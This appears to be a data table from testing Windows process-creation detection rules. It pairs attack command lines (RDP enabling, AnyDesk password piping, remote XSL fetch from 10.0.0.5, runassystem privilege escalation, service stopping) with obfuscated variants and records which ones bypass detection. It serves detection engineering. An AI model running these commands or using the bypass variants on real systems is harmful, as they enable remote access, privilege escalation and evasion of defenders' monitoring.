Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f /span /w:1024 /h:768	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f /span /w:1024 /h:768	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f /span /w:1024 /h:768 /public	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f /span /w:1024 /h:768 /public	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f /span /w:1024 /h:768 /public /admin	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f /span /w:1024 /h:768 /public /admin	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_mstsc_remote_connection	New Remote Desktop Connection Initiated Via Mstsc.EXE	954f0af7-62dd-418f-b3df-a84bc2c7a774	C:\\WINDOWS\\system32\\mstsc.exe  /v:THAIMX /f /span /w:1024 /h:768 /public /admin /noconnect	C:\\WINDOWS\\system32\\mstsc.exe /v:THAIMX /f /span /w:1024 /h:768 /public /admin /noconnect	TRUE	FALSE	FALSE	New Remote Desktop Connection Initiated Via Mstsc.EXE (954f0af7-62dd-418f-b3df-a84bc2c7a774)
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536		reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal\ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	TRUE	TRUE	TRUE	
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536	"reg  add \""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"	"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Potential Tampering With RDP Related Registry Keys Via Reg.EXE (0d5675be-bc88-4172-86d3-1e96a4476536)
t1021.001	proc_creation_win_reg_rdp_keys_tamper	Potential Tampering With RDP Related Registry Keys Via Reg.EXE	0d5675be-bc88-4172-86d3-1e96a4476536	reg  add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	TRUE	FALSE	FALSE	Potential Tampering With RDP Related Registry Keys Via Reg.EXE (0d5675be-bc88-4172-86d3-1e96a4476536)
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af	mstsc.exe  C:\Temp\hidden.rdp	mstsc.exe C:\Temp\hidden.rdp	TRUE	FALSE	FALSE	Mstsc.EXE Execution With Local RDP File (5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af)
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af		mstsc.exe C:\Users\Public\malicious.rdp -f	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af		"mstsc.exe ""C:\Temp\hidden.rdp"""	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file	Mstsc.EXE Execution With Local RDP File	5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af		mstsc.exe C:\Users\Public\malicious.rdp /f	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file_susp_location	Suspicious Mstsc.EXE Execution With Local RDP File	6e22722b-dfb1-4508-a911-49ac840b40f8		"mstsc.exe ""C:\Users\Public\connection.rdp"""	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_mstsc_run_local_rdp_file_susp_location	Suspicious Mstsc.EXE Execution With Local RDP File	6e22722b-dfb1-4508-a911-49ac840b40f8	mstsc.exe  C:\Users\thaim\AppData\Local\Temp\rogue.rdp	mstsc.exe %TEMP%\rogue.rdp	TRUE	FALSE	FALSE	Suspicious Mstsc.EXE Execution With Local RDP File (6e22722b-dfb1-4508-a911-49ac840b40f8); Mstsc.EXE Execution With Local RDP File (5fdce3ac-e7f9-4ecd-a3aa-a4d78ebbf0af)
t1219.002	proc_creation_win_mstsc_run_local_rdp_file_susp_location	Suspicious Mstsc.EXE Execution With Local RDP File	6e22722b-dfb1-4508-a911-49ac840b40f8		mstsc.exe C:\Windows\Temp\payload.rdp -f	TRUE	TRUE	TRUE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli	Remote Access Tool - AnyDesk Piped Password Via CLI	b1377339-fda6-477a-b455-ac0923f9ec2c		"cmd.exe /c ""echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password"""	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli	Remote Access Tool - AnyDesk Piped Password Via CLI	b1377339-fda6-477a-b455-ac0923f9ec2c		"cmd.exe /C echo J9kzQ2Y0qO | ""C:\ProgramData\anydesk.exe"" --set-password"	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli	Remote Access Tool - AnyDesk Piped Password Via CLI	b1377339-fda6-477a-b455-ac0923f9ec2c	cmd.exe /c echo J9kzQ2Y0qO^|C:\ProgramData\anydesk.exe --set-password	cmd.exe /c echo J9kzQ2Y0qO^|C:\ProgramData\anydesk.exe --set-password	TRUE	FALSE	FALSE	Remote Access Tool - AnyDesk Piped Password Via CLI (b1377339-fda6-477a-b455-ac0923f9ec2c)
t1219.002	proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli	Remote Access Tool - AnyDesk Piped Password Via CLI	b1377339-fda6-477a-b455-ac0923f9ec2c		cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_silent_install	Remote Access Tool - AnyDesk Silent Installation	114e7f1c-f137-48c8-8f54-3088c24ce4b9		anydesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_anydesk_silent_install	Remote Access Tool - AnyDesk Silent Installation	114e7f1c-f137-48c8-8f54-3088c24ce4b9		anydesk.exe --install C:\ProgramData\AnyDesk --silent --start-with-win	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe -meshServiceName MyService	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName=MyService	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --otherArg	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --meshServiceName AnotherService	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --meshServiceName AnotherService --meshServiceName FinalService	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --meshServiceName AnotherService --meshServiceName FinalService --otherArg	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --meshServiceName AnotherService --meshServiceName FinalService --otherArg --yetAnotherArg	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_meshagent_arguments	Remote Access Tool - Potential MeshAgent Execution - Windows	2fbbe9ff-0afc-470b-bdc0-592198339968		meshagent.exe --meshServiceName MyService --meshServiceName AnotherService --meshServiceName FinalService --otherArg --yetAnotherArg --moreArgs	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName -arg1 -arg2	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		"meshagent.exe --meshServiceName"""""	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe -meshServiceName	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName`	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName^	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName`echo	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName\	FALSE	FALSE	FALSE	
t1219.002	proc_creation_win_remote_access_tools_renamed_meshagent_execution	Remote Access Tool - Renamed MeshAgent Execution - Windows	b471f462-eb0d-4832-be35-28d94bdb4780		meshagent.exe --meshServiceName`echo`	FALSE	FALSE	FALSE	
t1220	proc_creation_win_msxsl_remote_execution	Remote XSL Execution Via Msxsl.EXE	75d0a94e-6252-448d-a7be-d953dff527bb		msxsl.exe local.xml http://10.0.0.5/malicious.xsl	FALSE	FALSE	FALSE	
t1220	proc_creation_win_msxsl_remote_execution	Remote XSL Execution Via Msxsl.EXE	75d0a94e-6252-448d-a7be-d953dff527bb		msxsl.exe local.xml http://10.0.0.5/malicious.xsl -xsl:	FALSE	FALSE	FALSE	
t1220	proc_creation_win_msxsl_remote_execution	Remote XSL Execution Via Msxsl.EXE	75d0a94e-6252-448d-a7be-d953dff527bb		"msxsl.exe local.xml ""http://10.0.0.5/malicious.xsl"""	FALSE	FALSE	FALSE	
t1220	proc_creation_win_msxsl_remote_execution	Remote XSL Execution Via Msxsl.EXE	75d0a94e-6252-448d-a7be-d953dff527bb		msxsl.exe local.xml http://10.0.0.5/malicious.xsl -o output.xml	FALSE	FALSE	FALSE	
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	"C:\\WINDOWS\system32\net1   share \""\\test\\share\"" /delete"	"C:\\WINDOWS\system32\net1  share ""\\test\\share"" /delete"	TRUE	FALSE	FALSE	Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	C:\\WINDOWS\system32\net1   share \\test\\share /delete	C:\\WINDOWS\system32\net1  share \\test\\share /delete	TRUE	FALSE	FALSE	Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896); Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896		C:\\WINDOWS\system32\net1  share \\test\\share /D	TRUE	TRUE	FALSE	Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	C:\\WINDOWS\system32\net1   share C$ /delete	C:\\WINDOWS\system32\net1  share C$ /delete	TRUE	FALSE	FALSE	Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896	C:\\WINDOWS\system32\net1   share IPC$ /delete	C:\\WINDOWS\system32\net1  share IPC$ /delete	TRUE	FALSE	FALSE	Unmount Share Via Net.EXE (cb7c4a03-2871-43c0-9bbb-18bbdb079896)
t1070.005	proc_creation_win_net_share_unmount	Unmount Share Via Net.EXE	cb7c4a03-2871-43c0-9bbb-18bbdb079896		C:\\WINDOWS\system32\net1  share ADMIN$ /D	TRUE	TRUE	TRUE	
t1569.002	proc_creation_win_net_start_service	Start Windows Service Via Net.EXE	2a072a96-a086-49fa-bcb5-15cc5a619093	net  start sesshijack	net start sesshijack	TRUE	FALSE	FALSE	Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093); Start Windows Service Via Net.EXE (2a072a96-a086-49fa-bcb5-15cc5a619093)
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22	C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe   win child class Shell_TrayWnd hide class TrayClockWClass	C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe  win child class Shell_TrayWnd hide class TrayClockWClass	TRUE	FALSE	FALSE	PUA - NirCmd Execution (4e2ed651-1906-4a59-a78a-18220fca1b22)
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		copy nircmd.exe sys_utility.exe && sys_utility.exe win min process itunes.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		"n.exe ""e""""x""""e""""c"" ""h""""i""""d""""e"" notepad.exe"	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22	"cmd.exe /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe  exec hide notepad.exe"""	C:\AtomicRedTeam\atomics\..\ExternalPayloads\nircmd.exe  exec hide notepad.exe	TRUE	FALSE	FALSE	PUA - NirCmd Execution (4e2ed651-1906-4a59-a78a-18220fca1b22); PUA - NirCmd Execution (4e2ed651-1906-4a59-a78a-18220fca1b22)
t1569.002	proc_creation_win_pua_nircmd	PUA - NirCmd Execution	4e2ed651-1906-4a59-a78a-18220fca1b22		nircmd.exe execmd run calc.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		nircmd.exe runassystem cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		nircmd.exe  runassystem  cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		"nircmd.exe"" runassystem ""cmd.exe"	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		"nircmd.exe runassystem ""cmd.exe"	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		set a=run&& set b=assystem&& nircmd.exe %a%%b% cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		copy nircmd.exe n.exe && n.exe runassystem cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		nircmd.exe runassystem C:\Windows\System32\cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		nircmd.exe runassystem cmd.exe /c echo test	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nircmd_as_system	PUA - NirCmd Execution As LOCAL SYSTEM	d9047477-0359-48c9-b8c7-792cedcdc9c4		"nircmd.exe runassystem ""C:\Windows\System32\cmd.exe"" /c echo test"	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nsudo	PUA - NSudo Execution	771d1eb5-9587-4568-95fb-9ec44153a012		NSudo.exe -U:S -P:E whoami	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nsudo	PUA - NSudo Execution	771d1eb5-9587-4568-95fb-9ec44153a012		NSudo.exe -u:s -p:e whoami	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nsudo	PUA - NSudo Execution	771d1eb5-9587-4568-95fb-9ec44153a012		ren NSudo.exe not_suspicious.exe && .\not_suspicious.exe -U:S -P:E whoami	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nsudo	PUA - NSudo Execution	771d1eb5-9587-4568-95fb-9ec44153a012		NSudo.exe -ShowWindowMode:Hide -U:S -P:E whoami	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_nsudo	PUA - NSudo Execution	771d1eb5-9587-4568-95fb-9ec44153a012		NSudo.exe -M:H -U:E whoami	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_runxcmd	PUA - RunXCmd Execution	93199800-b52a-4dec-b762-75212c196542		RunXCmd.exe /account:system /exec:cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_runxcmd	PUA - RunXCmd Execution	93199800-b52a-4dec-b762-75212c196542		RunXCmd.exe /account=SYSTEM /exec=cmd.exe	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_runxcmd	PUA - RunXCmd Execution	93199800-b52a-4dec-b762-75212c196542		RunXCmd.exe /exec cmd.exe /account ti	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_runxcmd	PUA - RunXCmd Execution	93199800-b52a-4dec-b762-75212c196542		"RunXCmd.exe /exec=""cmd.exe"" /account=\""system\"""	FALSE	FALSE	FALSE	
t1569.002	proc_creation_win_pua_runxcmd	PUA - RunXCmd Execution	93199800-b52a-4dec-b762-75212c196542		RunXCmd.exe /account=system /exec=cmd.exe	FALSE	FALSE	FALSE	
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net  stop UltraViewService	net stop UltraViewService	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net1  stop UltraViewService	net1 stop UltraViewService	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net1   stop spooler	net1  stop spooler	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net.exe   stop spooler	net.exe  stop spooler	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827		"net.exe	stop	""ServiceName"""	TRUE	TRUE	TRUE	
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	C:\Windows\System32\net.exe  stop UltraViewService	C:\Windows\System32\net.exe stop UltraViewService	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net  stop /name:UltraViewService	net stop /name:UltraViewService	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
t1489	proc_creation_win_net_stop_service	Stop Windows Service Via Net.EXE	88872991-7445-4a22-90b2-a3adadb0e827	net  stop UltraViewService 	net stop UltraViewService > NUL	TRUE	FALSE	FALSE	Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Stop Windows Service Via Net.EXE (88872991-7445-4a22-90b2-a3adadb0e827); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03); Share And Session Enumeration Using Net.EXE (62510e69-616b-4078-b371-847da438cc03)
